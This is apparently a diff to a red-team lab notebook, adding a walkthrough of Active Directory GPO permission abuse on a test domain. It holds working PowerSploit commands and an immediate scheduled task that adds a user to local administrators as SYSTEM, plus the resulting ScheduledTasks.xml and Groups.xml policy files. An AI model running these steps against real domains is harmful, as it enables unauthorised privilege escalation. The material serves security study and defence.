@@ -247,13 +247,141 @@ The below indicates that the user `offense\spotless` has **WriteProperty**, **Wr
 
 ![](../../.gitbook/assets/screenshot-from-2018-12-18-14-57-21.png)
 
-It is know that those privileges can be abused - for more information about how to abuse ACL/ACE refer to the lab:
+More about general AD ACL/ACE abuse refer to the lab:
 
 {% page-ref page="abusing-active-directory-acls-aces.md" %}
+
+### Abusing the GPO Permissions
 
 We know the above ObjectDN from the above screenshot is referring to the `New Group Policy Object` GPO since the ObjectDN points to `CN=Policies` and also the `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}` which is the same in the GPO settings as highlighted below:
 
 ![](../../.gitbook/assets/screenshot-from-2018-12-18-15-05-25.png)
+
+If we want to search for misconfigured GPOs specifically, we can chain multiple cmdlets from PowerSploit like so:
+
+```csharp
+Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
+```
+
+![](../../.gitbook/assets/screenshot-from-2018-12-20-11-41-55.png)
+
+We can now resolve the computer names the GPO is applied to:
+
+```csharp
+Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
+```
+
+![](../../.gitbook/assets/screenshot-from-2018-12-20-11-42-04.png)
+
+One of the ways to abuse it and get code execution is to create an immediate task through the GPO like so:
+
+```csharp
+New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
+```
+
+![](../../.gitbook/assets/screenshot-from-2018-12-20-13-43-46.png)
+
+The above will add our user spotless to the local `administrators` group of the compromised box. Note how prior to the code execution the group does not contain user `spotless`:
+
+![](../../.gitbook/assets/screenshot-from-2018-12-20-13-40-11.png)
+
+### Force Policy Update
+
+ScheduledTask and its code will execute after the policy updates are pushed through \(roughly each 90 minutes\), but we can force it with `gpupdate /force` and see that our user spotless now belongs to local administrators:
+
+![](../../.gitbook/assets/screenshot-from-2018-12-20-13-45-18.png)
+
+### Under the hood
+
+If we observe the Scheduled Tasks for the `Misconfigured Policy` GPO, we can see our `evilTask` sitting there:
+
+![](../../.gitbook/assets/screenshot-from-2018-12-20-12-02-22.png)
+
+Below is the XML file that got created by `New-GPOImmediateTask` that represents our evil scheduled task in the GPO `Misconfigured Policy`:
+
+{% code-tabs %}
+{% code-tabs-item title="\\\\offense.local\\SysVol\\offense.local\\Policies\\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml" %}
+```markup
+<?xml version="1.0" encoding="utf-8"?>
+<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
+    <ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="evilTask" image="0" changed="2018-11-20 13:43:43" uid="{6cc57eac-b758-4c52-825d-e21480bbb47f}" userContext="0" removePolicy="0">
+        <Properties action="C" name="evilTask" runAs="NT AUTHORITY\System" logonType="S4U">
+            <Task version="1.3">
+                <RegistrationInfo>
+                    <Author>NT AUTHORITY\System</Author>
+                    <Description></Description>
+                </RegistrationInfo>
+                <Principals>
+                    <Principal id="Author">
+                        <UserId>NT AUTHORITY\System</UserId>
+                        <RunLevel>HighestAvailable</RunLevel>
+                        <LogonType>S4U</LogonType>
+                    </Principal>
+                </Principals>
+                <Settings>
+                    <IdleSettings>
+                        <Duration>PT10M</Duration>
+                        <WaitTimeout>PT1H</WaitTimeout>
+                        <StopOnIdleEnd>true</StopOnIdleEnd>
+                        <RestartOnIdle>false</RestartOnIdle>
+                    </IdleSettings>
+                    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+                    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+                    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
+                    <AllowHardTerminate>false</AllowHardTerminate>
+                    <StartWhenAvailable>true</StartWhenAvailable>
+                    <AllowStartOnDemand>false</AllowStartOnDemand>
+                    <Enabled>true</Enabled>
+                    <Hidden>true</Hidden>
+                    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+                    <Priority>7</Priority>
+                    <DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
+                    <RestartOnFailure>
+                        <Interval>PT15M</Interval>
+                        <Count>3</Count>
+                    </RestartOnFailure>
+                </Settings>
+                <Actions Context="Author">
+                    <Exec>
+                        <Command>cmd</Command>
+                        <Arguments>/c net localgroup administrators spotless /add</Arguments>
+                    </Exec>
+                </Actions>
+                <Triggers>
+                    <TimeTrigger>
+                        <StartBoundary>%LocalTimeXmlEx%</StartBoundary>
+                        <EndBoundary>%LocalTimeXmlEx%</EndBoundary>
+                        <Enabled>true</Enabled>
+                    </TimeTrigger>
+                </Triggers>
+            </Task>
+        </Properties>
+    </ImmediateTaskV2>
+</ScheduledTasks>
+```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
+### Users and Groups
+
+The same privilege escalation could be achieved by abusing the GPO Users and Groups feature. Note in the below file, line 6 where the user spotless is added to the local administrators group - we could change the user to something else, add another one or even add the user to another group/multiple groups since we can amend the policy configuration file in the shown location:
+
+{% code-tabs %}
+{% code-tabs-item title="\\\\offense.local\\SysVol\\offense.local\\Policies\\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\\Machine\\Preferences\\Groups" %}
+```markup
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
+    <Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2018-12-20 14:08:39" uid="{300BCC33-237E-4FBA-8E4D-D8C3BE2BB836}">
+        <Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)">
+            <Members>
+                <Member name="spotless" action="ADD" sid="" />
+            </Members>
+        </Properties>
+    </Group>
+</Groups>
+```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
 
 ## References
 
@@ -262,6 +390,8 @@ We know the above ObjectDN from the above screenshot is referring to the `New Gr
 {% embed url="https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--" %}
 
 {% embed url="https://adsecurity.org/?p=3658" %}
+
+{% embed url="http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/" %}
 
 {% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}
 
